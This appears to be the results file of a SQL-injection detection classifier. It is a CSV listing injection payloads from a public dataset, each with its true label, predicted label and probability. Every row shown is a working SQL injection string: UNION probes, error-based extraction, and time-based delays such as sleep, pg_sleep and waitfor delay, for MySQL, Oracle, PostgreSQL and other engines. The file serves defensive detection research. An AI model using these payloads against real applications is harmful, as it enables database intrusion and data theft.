text,source,true_label,pred_label,prob_sqli,correct
1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1""   )    )    as dvpb where 6673  =  6673",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
select case when 1802  =  7063 then 1 else null end--,sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nhuk'  =  'nhuk",sajid576/sql-injection-dataset,1,1,0.9999922513961792,1
"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",sajid576/sql-injection-dataset,1,1,0.9999920129776001,1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'cxor'  =  'cxor",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
-5113'   )    )     )   or 7200  =  3094--,sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1""  )   where 2367  =  2367",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
-7707'   )    )    union all select 3172#,sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1,  (  case when 5514  =  9602 then 1 else null end  )",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1""  )   where 4905  =  4905 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"end and    (    (   ""cxoi""  =  ""cxoi",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
-5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1  )   and make_set  (  8403  =  8403,8899  )",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
1  )   as ptxw where 9873  =  9873,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1'||  (  select 'jslz' where 8405  =  8405 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
1   )    )     )   and 4595  =  4595#,sajid576/sql-injection-dataset,1,1,0.9999920129776001,1
"1""  )   where 9093  =  9093",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-5211""   )    )    as bkvr where 4082  =  4082 or 2323  =  8052",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'dgwe' like 'dgwe",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1' in boolean mode  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  3343  =  3343",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1%""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""%""  =  """,sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1""  )   where 4913  =  4913",sajid576/sql-injection-dataset,1,1,0.9999923706054688,1
"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1'||  (  select 'flre' where 8250  =  8250 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
-9434'  )   union all select 3106#,sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1'+  (  select sged where 1181  =  1181 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
1 where 8135  =  8135,sajid576/sql-injection-dataset,1,1,0.9999909400939941,1
1   )    )    as qlkf where 6635  =  6635,sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
1   )    )    as myxo where 1759  =  1759 union all select null#,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",sajid576/sql-injection-dataset,1,1,0.9999914169311523,1
"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-8065""   )    )     )   order by 1--",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1%""   )    )     )   order by 1#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1  )   where 3738  =  3738 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"select * from generate_series  (  6414,6414,case when   (  6414  =  6455  )   then 1 else 0 end  )   limit 1--",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1"" or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
select sleep  (  5  )   and 'mlmu'  =  'mlmu,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1'+  (  select 'yyyn' where 5395  =  5395,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-3359 union all select 4675,4675,4675--",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"-9263'  )   as qodg where 6798  =  6798 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1""  )   union all select null,null,null--",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1'  )   union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1   )    )    as vycb where 3524  =  3524 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1%'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'zknl'  =  'zknl",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"iif  (  1483  =  7301,1,1/0  )",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1""  )   as kuuf where 6908  =  6908",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-2838"" where 5442  =  5442 union all select 5442#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1' where 6905  =  6905 union all select null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
1 and sleep  (  5  ),sajid576/sql-injection-dataset,1,1,0.9999921321868896,1
1' where 1692  =  1692,sajid576/sql-injection-dataset,1,1,0.9999920129776001,1
"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-5160'  )   union all select 8067,8067,8067,8067,8067,8067,8067--",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
-3867%'  )   or 3084  =  5633 and   (  '%'  =  ',sajid576/sql-injection-dataset,1,1,0.9999923706054688,1
"1%'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  '%'  =  '",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",sajid576/sql-injection-dataset,1,1,0.9999922513961792,1
1'||  (  select 'ghby' from dual where 4854  =  4854,sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1'+  (  select 'jkgf' where 7487  =  7487,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1"" where 1809  =  1809 and make_set  (  8403  =  8403,8899  )  --",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"-8661"" union all select 5731,5731--",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""dhss""  =  ""dhss",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""qgle"" like ""qgle",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
"select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",sajid576/sql-injection-dataset,1,1,0.9999922513961792,1
"1'||  (  select 'drna' from dual where 5082  =  5082 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1"" union all select null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9999922513961792,1
1'  )   where 3730  =  3730 and sleep  (  5  )  #,sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"-8919"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""nstr""  =  ""nstr",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"-2518' union all select 6818,6818,6818,6818,6818,6818#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",sajid576/sql-injection-dataset,1,1,0.9999927282333374,1
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sajid576/sql-injection-dataset,1,1,0.9999924898147583,1
"1'   )    )    union all select null,null,null,null,null,null,null,null#",sajid576/sql-injection-dataset,1,1,0.9999926090240479,1
"1  )   where 9829  =  9829 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sajid576/sql-injection-dataset,1,1,0.999992847442627,1
